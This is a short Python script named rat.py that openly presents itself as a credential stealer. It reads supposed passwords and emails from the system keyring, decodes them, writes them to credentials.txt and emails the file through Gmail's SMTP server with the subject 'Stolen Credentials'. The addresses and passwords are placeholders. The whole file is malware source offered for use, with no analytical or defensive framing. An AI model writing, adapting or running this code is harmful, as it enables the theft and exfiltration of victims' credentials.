# rat.py

import smtplib
import keyring
import os
import subprocess
import base64
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Function to retrieve stored passwords and emails
def get_stored_credentials():
    credentials = {}
    try:
        # Retrieve passwords from keyring
        passwords = keyring.get_password("system", "passwords")
        if passwords:
            credentials["passwords"] = base64.b64decode(passwords).decode('utf-8')
    except Exception as e:
        print(f"Error retrieving passwords: {e}")

    try:
        # Retrieve emails from keyring
        emails = keyring.get_password("system", "emails")
        if emails:
            credentials["emails"] = base64.b64decode(emails).decode('utf-8')
    except Exception as e:
        print(f"Error retrieving emails: {e}")

    return credentials

# Function to send email
def send_email(to_email, subject, body, attachment_path):
    from_email = "your_email@example.com"
    from_password = "your_email_password"

    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    try:
        with open(attachment_path, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {os.path.basename(attachment_path)}",
        )
        msg.attach(part)
    except Exception as e:
        print(f"Error attaching file: {e}")

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_email, from_password)
        text = msg.as_string()
        server.sendmail(from_email, to_email, text)
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(f"Error sending email: {e}")

if __name__ == "__main__":
    # Retrieve stored credentials
    credentials = get_stored_credentials()

    # Save credentials to a file
    with open("credentials.txt", "w") as f:
        for key, value in credentials.items():
            f.write(f"{key}: {value}\n")

    # Send the file as an email attachment
    to_email = "recipient_email@example.com"
    subject = "Stolen Credentials"
    body = "Here are the stolen credentials."
    attachment_path = "credentials.txt"
    send_email(to_email, subject, body, attachment_path)
